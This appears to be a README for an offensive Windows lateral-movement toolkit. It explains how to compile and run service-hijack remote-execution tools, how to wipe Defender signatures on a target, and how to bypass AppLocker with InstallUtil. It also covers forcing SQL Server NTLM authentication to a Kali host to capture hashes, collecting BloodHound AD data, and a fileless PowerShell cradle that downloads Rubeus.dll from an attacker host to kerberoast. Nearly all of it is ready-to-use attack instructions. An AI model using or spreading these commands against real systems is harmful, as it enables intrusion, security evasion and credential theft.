# windows lateral movement

Mixed bag — some files you compile, some are pre-built tools, some are scripts. None of them depend on each other.

---

## File Roles

| File | Type | Standalone? | What it does |
|------|------|-------------|--------------|
| `PSLessExec.cs` | C# source | Yes (compile it) | Remote code execution via SCM service hijack |
| `smb_trigger.cs` | C# source | Yes (compile it) | Forces SQL Server NTLM auth to Kali (hash capture) |
| `SharpHound.ps1` | PowerShell script | Yes (run directly) | BloodHound AD data collection |
| `SCShell.exe` | Pre-compiled binary | Yes (run directly) | Remote service hijack (same idea as PSLessExec) |
| `Rubeus.dll` | Pre-compiled DLL | No (load it) | Kerberos attacks — load via reflection or Cobalt Strike |
| `accesschk.exe` | Pre-compiled binary | Yes (run directly) | Sysinternals ACL/permission enumeration |
| `latmov.exe` | Pre-compiled binary | Yes (run directly) | Lateral movement helper |

---

## PSLessExec.cs — Compile and Use

Remote code execution via Windows Service Control Manager. No PowerShell Remoting needed.

**Three-pass approach:**
1. Wipe Defender signatures on the target (`MpCmdRun.exe -RemoveDefinitions -All`)
2. Run your payload binary
3. Restore the original service binary path

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `pslessexec`, .NET Framework 4.8
2. Paste `PSLessExec.cs`, delete defaults
3. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
4. Build → Build Solution → `bin\x64\Debug\pslessexec.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /out:pslessexec.exe PSLessExec.cs`

```cmd
:: Run (from your compromised host)
.\pslessexec.exe <TARGET> <SERVICE_NAME> <PAYLOAD_PATH_ON_TARGET>
# Example:
.\pslessexec.exe appsrv01 SensorService C:\Users\Public\runner.exe

# With InstallUtil bypass (if AppLocker blocks your .exe):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U pslessexec.exe
```

---

## smb_trigger.cs — Compile and Use

Connects to a SQL Server and triggers NTLM authentication to your Kali machine via `xp_dirtree`. Captures the SQL service account's NTLMv2 hash.

**Compile — Visual Studio (Windows dev box):**
1. File → New → Console App (.NET Framework), name `smb_trigger`, .NET Framework 4.8
2. Paste `smb_trigger.cs`, delete defaults
3. Right-click References → Add Reference → Assemblies → check **System.Data** → OK
4. Project → Properties → Build → Platform target: **x64**, ☑ Allow unsafe code
5. Build → Build Solution → `bin\x64\Debug\smb_trigger.exe`

**Alt (Windows cmd):** `csc.exe /unsafe /platform:x64 /out:smb_trigger.exe smb_trigger.cs`

```bash
# 1. Start Responder on Kali first
sudo responder -I eth0 -wv

# 2. Run from compromised host
.\smb_trigger.exe <SQL_SERVER_FQDN_OR_IP> \\<KALI_IP>\share

# Hash appears in Responder output — crack offline or relay
```

---

## SharpHound.ps1 — Run Directly

BloodHound data collector. Outputs ZIP file with AD relationship data.

```powershell
# Import and run (in a PS session on the victim)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain corp.local -ZipFileName output.zip

# Copy output.zip to Kali and import into BloodHound GUI
```

---

## SCShell.exe — Run Directly (Pre-compiled)

Same service hijack technique as PSLessExec but pre-compiled. Use it if you don't want to compile PSLessExec yourself.

```bash
.\SCShell.exe <TARGET> <SERVICE_NAME> <COMMAND> <DOMAIN> <USERNAME> <PASSWORD>
```

---

## Rubeus.dll — Load via Reflection

Pre-compiled .NET DLL for Kerberos attacks. Load it into memory via PowerShell:

```powershell
# Fileless load
$data   = (New-Object Net.WebClient).DownloadData('http://<KALI_IP>/Rubeus.dll')
$assem  = [System.Reflection.Assembly]::Load($data)
$type   = $assem.GetType('Rubeus.Program')
$method = $type.GetMethod('Main')
$method.Invoke($null, @(,[string[]]@('kerberoast', '/outfile:hashes.txt')))
```

Or use from Cobalt Strike / meterpreter's `load powershell` + `powershell_execute`.

---

## accesschk.exe — Run Directly

Sysinternals tool for enumerating permissions:

```bash
# Find services the current user can write to
.\accesschk.exe -uwcqv "Everyone" * 2>nul
.\accesschk.exe -uwcqv <USERNAME> * 2>nul

# Find writable registry keys for services
.\accesschk.exe -uwdqv HKLM\SYSTEM\CurrentControlSet\Services
```
